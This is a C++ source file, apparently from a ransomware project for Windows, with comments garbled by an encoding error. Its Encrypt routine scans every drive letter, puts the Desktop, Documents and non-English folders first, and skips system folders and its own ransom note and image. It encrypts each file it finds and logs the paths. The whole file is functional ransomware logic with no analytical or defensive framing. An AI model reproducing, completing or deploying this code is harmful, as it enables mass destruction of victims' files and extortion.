#pragma once
#include <shlobj.h>
#include "tool.h"
#include "fileEncrypt.h"
#include "var.h"

using std::endl;
using std::exception;

//�����ļ�������ļ�
void specialPathInit()
{
	//����·��
	specialPaths[specialPathNum] = DesktopPath;
	specialPathNum++;
	//�ĵ��ļ���·��
	specialPaths[specialPathNum] = getSpecialPath(CSIDL_PERSONAL);
	specialPathNum++;
}

//��pathĿ¼����Ϊname�ļ��Ĵ���
void fileProcess(string path, string name)
{
	string nPath = path + "\\" + name;
	//�ļ�����
	if (nPath == EXEPATH || nPath == FilePaths || nPath == DesktopPath + "\\msg.txt" || nPath == DesktopPath + "\\pic.jpg") //��ֹ���ܱ�������֪ͨ�ļ�
		return;
	try
	{
		fileEncryptFunc(nPath);
		FileNameWriter << nPath << endl;
	}
	catch (exception& e)
	{
		;
	}
}

//���������Ŀ¼
void DirWalk(string path)
{
	if (_access(path.c_str(), 0) != 0) //·��������
	{
		//printf("%s not exist!", path.c_str()); //���ԣ�����������������������������
		return;
	}
	long fd;
	int temp;
	struct _finddata_t fileinfo;
	string newpath;
	newpath = path + "\\*";
	fd = _findfirst(newpath.c_str(), &fileinfo); //���ҵ�һ��
	if (fd != -1)
	{
		if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
		{
			//��һ��filenameһ����'.' �����һ�㲻�ᱻ����
			temp = fileOrDir(fileinfo);
			if (temp == 1) //�ļ��� ����
			{
				string nextpath;
				nextpath = path + "\\" + fileinfo.name;
				DirWalk(nextpath);
			}
			else if (temp == 0) //�ļ�����
			{
				fileProcess(path, fileinfo.name);
			}
		}
		while (!_findnext(fd, &fileinfo))
		{
			if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
			{
				if (fileinfo.attrib == 22) //�����ļ��в�����
				{
					HideDir.insert(HideDir.begin(), path + "\\" + fileinfo.name);
					continue;
				}
				temp = fileOrDir(fileinfo);
				if (temp == 1) //�ļ��� ����
				{
					string nextpath = path + "\\" + fileinfo.name;
					DirWalk(nextpath);
				}
				else if (temp == 0) //�ļ�����
				{
					fileProcess(path, fileinfo.name);
				}
			}
		}
		_findclose(fd); //�ر�
	}
}

//��Ҫ�ƹ����ļ���
string NDWPATH[100] = {
	":\\ program",   //���޻��޵����������ղ��ļ���
	":\\Zresources", //�����ĳ������ղ��ļ���
	":\\Windows",
	":\\Program Files (x86)",
	":\\Program Files",
	":\\ProgramData",
	":\\PerfLogs" };
int NDWPATHNUM = 6;
//����path�µ��ļ������ļ�ȫ������
void DirWalk2(string path, int fflag = 0)
{
	//printf("scan: %s\t\n", path.c_str()); //����!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	if (_access(path.c_str(), 0) != 0) //·��������
	{
		return;
	}
	//����Ŀ¼����,���ղ��ļ���, windows�ļ��е�
	for (int i = 0; i < NDWPATHNUM; i++)
		if (path.find(NDWPATH[i]) == 1)
		{
			//printf("special dir pass %s\n", path.c_str()); //����!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
			return;
		}
	//�ƹ��Ѿ��������������ļ���
	for (int i = 0; i < specialPathNum; i++)
		if (path == specialPaths[i])
		{
			//printf("pass %s\n", path.c_str()); //����!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
			return;
		}
	//
	long fd;
	int temp;
	struct _finddata_t fileinfo;
	string newpath;
	newpath = path + "\\*";
	fd = _findfirst(newpath.c_str(), &fileinfo); //���ҵ�һ��
	if (fd != -1)
	{
		if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
		{
			//��һ��filenameһ����'.' �����һ�㲻�ᱻ����
			temp = fileOrDir(fileinfo);
			if (temp == 1) //�ļ��� ����
			{
				string nextpath;
				nextpath = path + "\\" + fileinfo.name;
				DirWalk2(nextpath, fflag);
			}
			else if (temp == 0) //�ļ�����
			{
				fileProcess(path, fileinfo.name);
			}
		}
		while (!_findnext(fd, &fileinfo))
		{
			if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
			{
				if (fileinfo.attrib == 22 && fflag == 0) //�����ļ�����ʱ������
				{
					HideDir.insert(HideDir.begin(), path + "\\" + fileinfo.name);
					continue;
				}
				temp = fileOrDir(fileinfo);
				if (temp == 1) //�ļ��д���
				{
					string nextpath = path + "\\" + fileinfo.name;
					//printf("fileinfo: %d  ", fileinfo.attrib); //���ԣ�����������������������
					DirWalk2(nextpath, fflag);
				}
				else if (temp == 0) //�ļ�����
				{
					fileProcess(path, fileinfo.name);
				}
			}
		}
		_findclose(fd); //�ر�
	}
}

void Encrypt() //����
{
	char pf[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
	string a = "C:";
	for (int i = 0; i < 26; i++)
	{
		//ɨ�赱ǰ�̷��µ��ļ�, ���ȱ������ܴ�����Ҫ�ļ���Ŀ¼
		a[0] = pf[i];
		if (_access(a.c_str(), 0) != 0) //·��������
		{
			continue;
		}
		long fd;
		struct _finddata_t fileinfo;
		string newpath;
		vector<string> PathList1; //��Ӣ��Ŀ¼
		vector<string> PathList2; //����Ŀ¼
		newpath = a + "\\*";
		fd = _findfirst(newpath.c_str(), &fileinfo); //���ҵ�һ��
		if (fd != -1)
		{
			while (!_findnext(fd, &fileinfo))
			{
				if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
				{
					//printf("rootD:  %s\n", fileinfo.name); //���ԣ�����������������������������������������������
					if (fileinfo.attrib == 22) //�����ļ�����ʱ������
					{
						HideDir.insert(HideDir.begin(), a + "\\" + fileinfo.name);
						continue;
					}
					int temp = fileOrDir(fileinfo);
					if (temp == 1) //�ļ��д���
					{
						int k;
						string nextpath = a + "\\" + fileinfo.name;
						for (k = 0; k < sizeof(nextpath); k++) //�ж��Ƿ��Ƿ�Ӣ��Ŀ¼
						{
							if (nextpath[k] == 0)
							{
								k = 0x0fffffff;
								break;
							}
							if (nextpath[k] > 255 || nextpath[k] < 0)
							{
								// printf("Cchar: %c---%d---%s---%d \n", nextpath[k], k, nextpath.c_str(), sizeof(nextpath)); //���ԣ���������������������������������
								// for (int mm = 0; mm < sizeof(nextpath); mm++)
								//     printf("%.2x-", nextpath[mm]);
								// printf("\n");
								PathList1.push_back(nextpath);
								break;
							}
						}
						if (k >= sizeof(nextpath))
							PathList2.push_back(nextpath);
					}
					else if (temp == 0) //�ļ�����
					{
						fileProcess(a, fileinfo.name);
					}
				}
			}
			_findclose(fd); //�ر�
		}
		for (int j = 0; j < PathList1.size(); j++)
		{
			//printf("List1: %s\n", PathList1[j].c_str());
			DirWalk2(PathList1[j]);
		}
		//�����趨������Ŀ¼
		specialPathInit(); //��ʼ������Ŀ¼
		//��������Ŀ¼
		for (int i = 0; i < specialPathNum; i++)
		{
			DirWalk(specialPaths[i]);
		}
		//������ͨĿ¼
		for (int j = 0; j < PathList2.size(); j++)
		{
			//printf("List2: %s\n", PathList2[j].c_str());
			DirWalk2(PathList2[j]);
		}
	}
}